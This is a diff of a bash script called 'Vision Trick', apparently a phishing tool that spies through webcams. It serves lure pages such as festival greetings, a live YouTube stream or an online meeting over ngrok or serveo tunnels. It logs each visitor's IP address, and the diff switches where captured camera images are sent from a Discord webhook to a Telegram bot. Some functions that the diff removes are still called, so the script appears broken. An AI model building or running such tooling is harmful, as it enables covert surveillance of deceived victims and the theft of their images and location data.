@@ -1,33 +1,29 @@
 #!/bin/bash
-# Vision Trick v1.0
-# Powered by gh0stri13y & 0xtor.exe
+# Vision Trick v1.1
+# Powered by TechChip (Modified for Vision Trick)
+# Credits to thelinuxchoice [github.com/thelinuxchoice/]
+
+trap 'printf "\n";stop' 2
+
 banner() { 
-clear
+    clear
     printf "\e[1;36m__     _____ ____ ___ ___  _   _    _____ ____  ___ ____ _  __\e[0m\n"
     printf "\e[1;36m\ \   / /_ _/ ___|_ _/ _ \| \ | |  |_   _|  _ \|_ _/ ___| |/ /\e[0m\n"
     printf "\e[1;36m \ \ / / | |\___ \| | | | |  \| |    | | | |_) \| | |   | ' / \e[0m\n"
     printf "\e[1;36m  \ V /  | | ___) | | |_| | |\  |    | | |  _ < | | |___| . \ \e[0m\n"
-    printf "\e[1;36m   \_/  |___|____/___\___/|_| \_|    |_| |_| \_\___\____|_|\_\  V1.0\e[0m\n"
-    printf "\e[1;33m VisionTrick v1.0 \e[0m\n"
+    printf "\e[1;36m   \_/  |___|____/___\___/|_| \_|    |_| |_| \_\___\____|_|\_\  V1.1\e[0m\n"
+    printf "\e[1;33m VisionTrick v1.1 \e[0m\n"
     printf "\e[1;92m KeepEye On Everywhere \e[0m\n"
-    printf "\e[1;35m 0xtorexe.netlify.app | linktr.ee/0xtor.exe \e[0m\n"
+    printf "\e[1;35m linktr.ee/ghostri13y | linktr.ee/0xtor.exe \e[0m\n"
     printf "\n"
 }
-check_discord_webhook() {
-    if [[ -z "$discord_webhook_url" ]]; then
-        printf "\e[1;91m[!] Error: Discord webhook URL is not set.\e[0m\n"
-        printf "\e[1;77m[*] Please provide a valid Discord webhook URL.\e[0m\n"
-        exit 1
-    fi
 
-    sed -i "s|https://discord.com/api/webhooks/your_webhook_url_here|$discord_webhook_url|g" post.php
-    printf "\e[1;92m[\e[0m+\e[1;92m] Discord webhook URL updated successfully!\e[0m\n"
-}
-
-dependencies() {
+check_dependencies() {
     command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
     command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
-    command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Install it. Aborting."; exit 1; }
+    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+    command -v python3 > /dev/null 2>&1 || { echo >&2 "I require python3 but it's not installed. Install it. Aborting."; exit 1; }
 }
 
 stop() {
@@ -48,55 +44,51 @@ stop() {
     exit 1
 }
 
-catch_ip() {
-    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-    IFS=$'\n'
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-    cat ip.txt >> saved.ip.txt
-}
-
-checkfound() {
-    printf "\n"
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-    while [ true ]; do
-        if [[ -e "ip.txt" ]]; then
-            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-            catch_ip
-            rm -rf ip.txt
-        fi
-
-        sleep 0.5
-
-        if [[ -e "Log.log" ]]; then
-            printf "\n\e[1;92m[\e[0m+\e[1;92m] Image captured and sent to Discord!\e[0m\n"
-            rm -rf Log.log
-        fi
-        sleep 0.5
-    done
-}
-
-server() {
-    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-
-    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
-
-    if [[ $checkphp == *'php'* ]]; then
-        killall -2 php > /dev/null 2>&1
-    fi
-
-    if [[ $subdomain_resp == true ]]; then
-        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink' &
-        sleep 8
-    else
-        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink' &
-        sleep 8
-    fi
-    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting PHP server... (localhost:3333)\e[0m\n"
+start_server() {
+    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting PHP server... (localhost:3333)\e[0m\n"
     fuser -k 3333/tcp > /dev/null 2>&1
     php -S localhost:3333 > /dev/null 2>&1 &
     sleep 3
-    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+}
+
+start_ngrok() {
+    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting ngrok server...\e[0m\n"
+    ./ngrok http 3333 > /dev/null 2>&1 &
+    sleep 10
+
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+    if [[ -z "$link" ]]; then
+        printf "\e[1;31m[!] Direct link is not generating, check following possible reasons: \e[0m\n"
+        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
+        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using Android, turn hotspot on\n"
+        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command: killall ngrok\n"
+        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
+        exit 1
+    else
+        printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+    fi
+}
+
+select_template() {
+    printf "\n-----Choose a template----\n"
+    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live YouTube TV\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+    default_option_template="1"
+    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+    option_tem="${option_tem:-${default_option_template}}"
+    if [[ $option_tem -eq 1 ]]; then
+        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+        fest_name="${fest_name//[[:space:]]/}"
+    elif [[ $option_tem -eq 2 ]]; then
+        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+    elif [[ $option_tem -eq 3 ]]; then
+        printf ""
+    else
+        printf "\e[1;93m [!] Invalid template option! Try again.\e[0m\n"
+        sleep 1
+        select_template
+    fi
 }
 
 payload_ngrok() {
@@ -112,36 +104,6 @@ payload_ngrok() {
         sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
     fi
     rm -rf index3.html
-}
-
-select_template() {
-    if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-        printf "\e[1;93m [!] Invalid tunnel option! Try again.\e[0m\n"
-        sleep 1
-        clear
-        banner
-        vision_trick
-    else
-        printf "\n-----Choose a template----\n"
-        printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
-        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live YouTube TV\e[0m\n"
-        printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
-        default_option_template="1"
-        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
-        option_tem="${option_tem:-${default_option_template}}"
-        if [[ $option_tem -eq 1 ]]; then
-            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
-            fest_name="${fest_name//[[:space:]]/}"
-        elif [[ $option_tem -eq 2 ]]; then
-            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
-        elif [[ $option_tem -eq 3 ]]; then
-            printf ""
-        else
-            printf "\e[1;93m [!] Invalid template option! Try again.\e[0m\n"
-            sleep 1
-            select_template
-        fi
-    fi
 }
 
 ngrok_server() {
@@ -203,7 +165,7 @@ ngrok_server() {
     if [[ -e ~/.ngrok2/ngrok.yml ]]; then
         printf "\e[1;93m[\e[0m*\e[1;93m] Your ngrok "
         cat ~/.ngrok2/ngrok.yml
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m' chg_token
         if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
             read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
             ./ngrok authtoken $ngrok_auth > /dev/null 2>&1 &
@@ -235,51 +197,83 @@ ngrok_server() {
     checkfound
 }
 
-vision_trick() {
-    if [[ -e sendlink ]]; then
-        rm -rf sendlink
-    fi
-
-    printf "\n-----Choose tunnel server----\n"
-    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-    default_option_server="1"
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
-    option_server="${option_server:-${default_option_server}}"
-    select_template
-    if [[ $option_server -eq 2 ]]; then
-        command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-        start
-    elif [[ $option_server -eq 1 ]]; then
-        ngrok_server
-    else
-        printf "\e[1;93m [!] Invalid option!\e[0m\n"
-        sleep 1
-        clear
-        vision_trick
-    fi
+catch_ip() {
+    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+    IFS=$'\n'
+    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+    cat ip.txt >> saved.ip.txt
 }
 
-start() {
-    default_choose_sub="Y"
-    default_subdomain="visiontrick$RANDOM"
+checkfound() {
+    printf "\n"
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+    while [ true ]; do
+        if [[ -e "ip.txt" ]]; then
+            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+            catch_ip
+            rm -rf ip.txt
+        fi
 
-    printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
-    read choose_sub
-    choose_sub="${choose_sub:-${default_choose_sub}}"
-    if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-        subdomain_resp=true
-        printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-        read subdomain
-        subdomain="${subdomain:-${default_subdomain}}"
-    fi
+        sleep 0.5
 
-    server
-    payload
-    checkfound
+        if [[ -e "Log.log" ]]; then
+            printf "\n\e[1;92m[\e[0m+\e[1;92m] Image captured and sent to Telegram!\e[0m\n"
+            
+            # Get the latest image file in the images/ directory
+            latest_image=$(ls -t images/*.png 2>/dev/null | head -n 1)
+            
+            if [[ -n "$latest_image" ]]; then
+                # Call the Python script and pass the image file path
+                echo "$latest_image" | python3 tel.py
+                if [[ $? -eq 0 ]]; then
+                    printf "\e[1;92m[\e[0m+\e[1;92m] Image sent successfully!\e[0m\n"
+                else
+                    printf "\e[1;91m[!] Failed to send image.\e[0m\n"
+                fi
+            else
+                printf "\e[1;91m[!] No images found in the images/ directory.\e[0m\n"
+            fi
+            
+            rm -rf Log.log
+        fi
+        sleep 0.5
+    done
 }
 
+# Main script execution
 banner
-dependencies
-check_discord_webhook
-vision_trick
+check_dependencies
+
+# Prompt the user to input the Telegram bot token and channel ID
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your Telegram bot token: \e[0m' telegramBotToken
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your Telegram channel ID: \e[0m' telegramChannelId
+
+# Validate the inputs
+if [[ -z "$telegramBotToken" || -z "$telegramChannelId" ]]; then
+    printf "\e[1;91m[!] Error: Bot token or channel ID is missing.\e[0m\n"
+    exit 1
+fi
+
+# Update the post.php file with the provided bot token and channel ID
+sed -i "s|YOUR_BOT_TOKEN|$telegramBotToken|g" post.php
+sed -i "s|@mychannel|$telegramChannelId|g" post.php
+
+# Continue with the rest of the script
+printf "\n-----Choose tunnel server----\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+select_template
+if [[ $option_server -eq 2 ]]; then
+    command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+    start
+elif [[ $option_server -eq 1 ]]; then
+    ngrok_server
+else
+    printf "\e[1;93m [!] Invalid option!\e[0m\n"
+    sleep 1
+    clear
+    vision_trick
+fi
